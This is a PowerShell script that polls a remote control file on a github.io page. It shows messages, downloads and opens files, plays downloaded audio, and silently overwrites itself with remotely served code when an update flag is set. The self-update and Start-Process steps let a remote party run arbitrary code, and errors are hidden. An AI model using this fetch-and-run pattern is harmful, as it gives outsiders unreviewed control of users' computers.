$ErrorActionPreference = "Stop"

function Wait-ForInternet {
    $pingTarget = "8.8.8.8"
    $maxWaitSeconds = 120
    $elapsed = 0

    while ($elapsed -lt $maxWaitSeconds) {
        try {
            if (Test-Connection -ComputerName $pingTarget -Count 1 -Quiet -ErrorAction Stop) {
                return $true
            }
        }
        catch { }

        Start-Sleep -Seconds 5
        $elapsed += 5
    }

    return $false
}

# Check for internet connection with timeout
if (-not (Wait-ForInternet)) {
    $scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
    $noInternetFile = Join-Path $scriptDir "noInternet.txt"

    if (Test-Path $noInternetFile) {
        try {
            $offlineMessage = Get-Content $noInternetFile -Raw
            Write-Host $offlineMessage
            Read-Host "Press Any Key to Exit!"
        }
        catch { }
    }
    exit
}

$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$scriptPath = $MyInvocation.MyCommand.Path
$url = "https://yastiwariservies.github.io/fantasy/chintu/DOTHIS.txt"

$musicPlayed = $false
$updateScheduled = $false
$updateUrl = ""

try {
    $response = Invoke-WebRequest -Uri $url -UseBasicParsing -ErrorAction Stop
    $content = $response.Content
}
catch {
    exit
}

$lines = $content -split "`n"

foreach ($line in $lines) {
    if ($line.Trim() -eq "") { continue }

    if ($line -match "^(?<key>\w+)=(?<flag>TRUE|FALSE)\s+URL=(?<url>\S+)$") {
        $key     = $matches['key']
        $flag    = $matches['flag']
        $fileUrl = $matches['url']

        if ($key -eq "haveMessage" -and $flag -eq "TRUE") {
            try {
                $msgResponse = Invoke-WebRequest -Uri $fileUrl -UseBasicParsing -ErrorAction Stop
                Write-Host $msgResponse.Content
            }
            catch { }
        }

        if ($key -eq "havePhoto" -and $flag -eq "TRUE") {
            try {
                $mediaDir = Join-Path $scriptDir "media"
                if (-not (Test-Path $mediaDir)) {
                    New-Item -Path $mediaDir -ItemType Directory | Out-Null
                }

                $ext = [System.IO.Path]::GetExtension($fileUrl)
                if ([string]::IsNullOrWhiteSpace($ext)) { $ext = ".jpg" }

                $photoFile = Join-Path $mediaDir ("image" + $ext)

                Invoke-WebRequest -Uri $fileUrl -OutFile $photoFile -ErrorAction Stop

                Start-Process $photoFile
            }
            catch { }
        }

        if ($key -eq "haveMusic" -and $flag -eq "TRUE") {
            try {
                $mediaDir = Join-Path $scriptDir "media"
                if (-not (Test-Path $mediaDir)) {
                    New-Item -Path $mediaDir -ItemType Directory | Out-Null
                }

                $ext = [System.IO.Path]::GetExtension($fileUrl)
                if ([string]::IsNullOrWhiteSpace($ext)) { $ext = ".wav" }

                $musicFile = Join-Path $mediaDir ("music" + $ext)

                Invoke-WebRequest -Uri $fileUrl -OutFile $musicFile -ErrorAction Stop

                Add-Type -AssemblyName System.Windows.Forms
                $player = New-Object System.Media.SoundPlayer
                $player.SoundLocation = $musicFile
                $player.Load()
                $player.PlaySync()

                $musicPlayed = $true
            }
            catch { }
        }

        if ($key -eq "hasUpdate" -and $flag -eq "TRUE") {
            $updateScheduled = $true
            $updateUrl = $fileUrl
        }
    }
}

if ($updateScheduled -and $updateUrl) {
    try {
        $newCode = Invoke-WebRequest -Uri $updateUrl -UseBasicParsing -ErrorAction Stop
        $backupPath = $scriptPath + ".bak"
        Copy-Item -Path $scriptPath -Destination $backupPath -Force
        Set-Content -Path $scriptPath -Value $newCode.Content -Force -Encoding UTF8
    }
    catch { }
}
